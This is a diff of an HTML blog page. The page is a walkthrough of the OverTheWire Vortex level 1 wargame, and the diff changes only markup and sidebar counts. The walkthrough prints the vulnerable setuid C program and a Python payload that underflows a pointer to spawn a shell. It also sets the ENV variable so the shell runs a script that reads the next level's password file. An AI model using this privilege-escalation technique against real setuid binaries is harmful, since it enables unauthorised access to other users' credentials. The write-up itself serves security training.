@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -121,10 +121,10 @@
             <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
                 <div id="niu2-main-content">
                     <p>Solution for http://www.overthewire.org/wargames/vortex/vortex1.shtml. Here's the code they have used:</p>
-<div class="highlight"><pre><span class="cp">#include </span>
-<span class="cp">#include </span>
-<span class="cp">#include </span>
-<span class="cp">#include</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> 
+<span class="cpf">#include </span><span class="cp"></span>
+<span class="cp">#include</span> 
+<span class="cpf">#include</span><span class="cp"></span>
 
 <span class="cp">#define e(); if(((unsigned int)ptr &amp; 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }</span>
 
@@ -154,7 +154,7 @@
 <span class="p">}</span>
 </pre></div>
 <p>The executable was at /<strong>vortex</strong>/vortex1:</p>
-<div class="highlight"><pre><span class="nv">$ </span>ls -l /vortex/vortex1
+<div class="highlight"><pre><span></span>$ ls -l /vortex/vortex1
 -r-sr-x--- <span class="m">1</span> vortex2 vortex1 <span class="m">7398</span> 2011-11-13 23:07 /vortex/vortex1
 </pre></div>
 <p>I hope you have noticed the SETUID-Bit which belongs to user vortex2. So that programm will run as vortex2. The password we need to find out is at /etc/vortex_pass/vortex2. Now let’s analyze the code...</p>
@@ -163,11 +163,11 @@
 <li>Everytime "\"" is read in, <code>ptr</code> is decremented. So we need to set ptr to the beginning of <code>buf</code>'s address</li>
 <li><code>e()</code> is a macro which checks if <code>*ptr = 0xCA</code>. If this is true, then an "interactive shell will be launched. This is what I did:</li>
 </ul>
-<div class="highlight"><pre><span class="nv">$ </span>python -c <span class="s1">'print "\\"*257 + "\xca" + "XXX"'</span> <span class="p">|</span> /vortex/vortex1 
-<span class="nv">$ </span>
+<div class="highlight"><pre><span></span>$ python -c <span class="s1">'print "\\"*257 + "\xca" + "XXX"'</span> <span class="p">|</span> /vortex/vortex1 
+$ 
 </pre></div>
 <p>Nothing happens. We need to execute the new process (/bin/sh) with some "extra arguments". I have created following script:</p>
-<div class="highlight"><pre><span class="nv">$ </span>cat script.sh 
+<div class="highlight"><pre><span></span>$ cat script.sh 
 cat /etc/vortex_pass/vortex2
 </pre></div>
 <p>...then as the bash manual states:</p>
@@ -175,9 +175,9 @@ cat /etc/vortex_pass/vortex2
 <p>"When invoked as an interactive shell with the name sh, bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute"</p>
 </blockquote>
 <p>We'll need to set the ENV variable properly and we're done:</p>
-<div class="highlight"><pre><span class="nv">$ </span>python -c <span class="s1">'print "\\"*257 + "\xca" + "XXX"'</span> <span class="p">|</span> env <span class="nv">ENV</span><span class="o">=</span>/tmp/****/script.sh /vortex/vortex1 
+<div class="highlight"><pre><span></span>$ python -c <span class="s1">'print "\\"*257 + "\xca" + "XXX"'</span> <span class="p">|</span> env <span class="nv">ENV</span><span class="o">=</span>/tmp/****/script.sh /vortex/vortex1 
 ******
-<span class="nv">$ </span>
+$ 
 </pre></div>
                 </div>
 <hr/>
@@ -220,7 +220,7 @@ cat /etc/vortex_pass/vortex2
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/coding/">coding</a><sup>26</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/vortex/">vortex</a><sup>3</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/appsec/">appsec</a><sup>25</sup></div>
                 </div>
